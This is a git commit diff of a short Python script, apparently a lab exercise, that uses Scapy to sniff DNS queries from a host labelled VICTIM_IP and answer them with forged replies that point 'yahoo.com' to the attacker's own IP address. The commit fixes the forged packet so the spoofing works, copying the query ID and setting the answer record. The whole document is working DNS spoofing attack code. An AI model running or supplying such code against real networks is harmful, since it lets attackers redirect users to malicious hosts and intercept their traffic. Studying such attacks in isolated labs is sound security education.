46efc5fc981fe6f6355a2874967fdcbf78be7850
BenGanon <92310078+Ben-Ganon@users.noreply.github.com>
2022-05-31 15:18:06 +0000

    next

--- ex1.py
+++ ex1.py
@@ -11,29 +11,30 @@ import sys
 THIS_IP = "192.168.100.129"
 VICTIM_IP = "192.168.100.128"
 
+THIS_IP_B = b'192.168.100.129'
+
 #packet_filt = " and ".join([
 #"udp dst port 53", # dns port filtering
 #"udp[10] & 0x80 = 0", # dns only
 #"src host 192.168.59.3"]) # ip source	
 
-packet_filter = f"udp port 53 and ip src {VICTIM_IP}"
+packet_filter = f"udp dst port 53 and ip src {VICTIM_IP}"
 
 
 def dns_reply(packet): 
 	print("received")
-	
 	if not packet.haslayer(UDP):
 		return
-	print("name is: ",packet[DNS].qd.qname)
 	if packet[DNS].qd.qname != b'yahoo.com.':
 		return
 	packet.show()
-	returnPack = IP(dst=packet[IP].src, src=packet[IP].dst)/UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/DNS(qd=packet[DNS].qd,arcount=1,aa=1,qr=1 ,ar=DNSRR(ttl=100, rrname=packet[DNS].qd.qname, rdata=THIS_IP))
+	returnPack = IP(dst=packet[IP].src, src=packet[IP].dst)/UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/DNS(id=packet[DNS].id, qd=packet[DNS].qd,ancount=1,aa=1,qr=1 ,an=DNSRR(ttl=100, rrname=packet[DNS].qd.qname, rdata=THIS_IP))
 	print("sending: ")
 	returnPack.show()
-	sendp(returnPack, iface="ens33")
+	send(returnPack, iface="ens33")
 
 print(packet_filter)
 print("started sniffing")
 sniff(filter = packet_filter,prn = dns_reply, store=0, iface="ens33")
 
+#,rdlen=len(THIS_IP)
